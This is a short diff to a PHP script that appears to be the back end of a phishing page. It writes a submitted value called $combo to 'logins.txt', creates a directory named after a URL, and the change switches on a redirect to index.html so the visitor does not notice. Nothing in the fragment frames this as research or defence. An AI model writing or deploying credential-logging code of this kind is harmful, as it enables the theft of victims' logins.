@@ -19,6 +19,5 @@ $file = fopen("logins.txt", "a");
 fwrite($file, $combo);
 mkdir($url);
 fopen($url . "/index.php", "w");
-//fclose($combo . "/index.php");
-//header("Location: index.html");
+header("Location: index.html");
 ?>
